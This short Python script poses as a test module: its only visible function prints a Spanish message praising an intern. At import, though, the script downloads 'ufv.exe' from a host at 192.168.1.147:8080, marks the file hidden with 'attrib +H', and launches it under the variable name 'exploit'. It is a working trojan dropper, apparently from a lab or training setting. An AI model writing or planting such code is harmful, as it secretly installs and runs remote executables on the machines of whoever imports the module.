import urllib.request
import subprocess


urllib.request.urlretrieve("http://192.168.1.147:8080/ufv.exe", "ufv.exe")

subprocess.check_call(["attrib","+H","ufv.exe"])

exploit = subprocess.Popen(["ufv.exe"])


def funcionPrueba():
    print("¡Buen trabajo becario! Función de prueba correctamente ejecutada, vuelve a tus tareas...")

